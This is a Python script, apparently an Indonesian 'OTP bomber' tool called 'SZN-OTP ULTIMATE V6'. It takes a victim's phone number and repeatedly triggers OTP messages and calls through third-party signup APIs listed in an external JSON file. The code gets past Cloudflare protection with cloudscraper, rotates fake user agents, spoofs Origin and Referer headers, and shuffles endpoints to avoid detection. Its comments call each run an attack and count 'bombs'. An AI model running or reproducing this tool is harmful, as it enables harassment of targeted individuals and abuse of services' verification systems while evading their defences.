import os, sys, time, json, random
import cloudscraper
from fake_useragent import UserAgent
from rich.console import Console
from rich.panel import Panel
from rich.live import Live
from rich.table import Table

# Inisialisasi
console = Console()
ua = UserAgent()
scraper = cloudscraper.create_scraper()

def banner():
    os.system('clear')
    console.print(Panel.fit(
        "[bold magenta]⚡ SZN-OTP ULTIMATE V6 ⚡[/bold magenta]\n"
        "[bold white]Status: [bold green]High Bypass Enabled[/bold green][/bold white]\n"
        "[bold cyan]Instagram: HZNXWICK[/bold cyan]",
        subtitle="[yellow]Advanced Modular Engine[/yellow]",
        border_style="bright_blue"
    ))

def send_request(api, target_full, target_biasa):
    headers = {
        "User-Agent": ua.random,
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Origin": "https://www.mapclub.com",
        "Referer": "https://www.mapclub.com/en/user/signup"
    }
    
    try:
        url = api['url'].format(target_full=target_full, target_tanpa_62=target_biasa)
        
        if api['method'] == "POST":
            # Format data JSON secara dinamis
            payload = {k: v.format(target_full=target_full, target_tanpa_62=target_biasa) if isinstance(v, str) else v for k, v in api['data'].items()}
            r = scraper.post(url, json=payload, headers=headers, timeout=10)
        else:
            r = scraper.get(url, headers=headers, timeout=10)
            
        if r.status_code in [200, 201]:
            return "[bold green]SUCCESS[/bold green]"
        else:
            return f"[bold red]FAIL ({r.status_code})[/bold red]"
    except:
        return "[bold yellow]TIMEOUT[/bold yellow]"

def main():
    banner()
    
    # Input Target
    target = console.input("[bold white][?] Nomor Target (08xxx): [/bold white]")
    jumlah = int(console.input("[bold white][?] Jumlah Bom: [/bold white]"))
    jeda = int(console.input("[bold white][?] Jeda (detik): [/bold white]"))

    # Load Database API
    try:
        with open('lib/api.json', 'r') as f:
            db = json.load(f)
    except:
        console.print("[bold red][!] File lib/api.json tidak ditemukan![/bold red]")
        return

    # Normalisasi Nomor
    bersih = target[1:] if target.startswith("0") else target[2:] if target.startswith("62") else target
    t_full = "+62" + bersih
    t_biasa = bersih

    # Proses Tempur
    console.print(f"\n[bold cyan][*] Memulai serangan ke {t_full}...[/bold cyan]\n")
    
    for i in range(jumlah):
        table = Table(title=f"Putaran ke-{i+1}", show_header=True, header_style="bold magenta")
        table.add_column("API Name", style="dim")
        table.add_column("Status", justify="right")
        
        with Live(table, refresh_per_second=4):
            # Gabungkan semua API (WhatsApp + Call)
            all_api = db['whatsapp'] + db['call']
            random.shuffle(all_api) # Acak API biar gak kebaca polanya
            
            for api in all_api:
                res = send_request(api, t_full, t_biasa)
                table.add_row(api['name'], res)
                time.sleep(1) # Jeda antar tembakan biar aman
        
        console.print(f"[bold yellow][!] Selesai putaran {i+1}, jeda {jeda} detik...[/bold yellow]")
        time.sleep(jeda)

if __name__ == "__main__":
    main()
